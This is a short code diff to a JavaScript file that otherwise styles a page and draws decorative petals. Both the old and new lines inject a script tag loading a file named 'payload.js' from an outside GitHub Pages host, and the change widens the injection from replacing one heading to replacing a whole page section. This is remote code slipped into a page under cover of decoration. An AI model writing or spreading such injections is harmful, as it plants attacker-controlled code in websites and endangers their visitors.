@@ -43,10 +43,10 @@ style.textContent = `
 // Append the style to the head
 document.head.appendChild(style);
 
-// Replace the <h2> text with the script tag
-const h2Element = document.querySelector('h2.lead');
-if (h2Element) {
-  h2Element.innerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script>`;
+// Replace the entire <section> element with the script tag
+const sectionElement = document.querySelector('section#section-page');
+if (sectionElement) {
+  sectionElement.outerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script>`;
 }
 
 // Function to create a petal
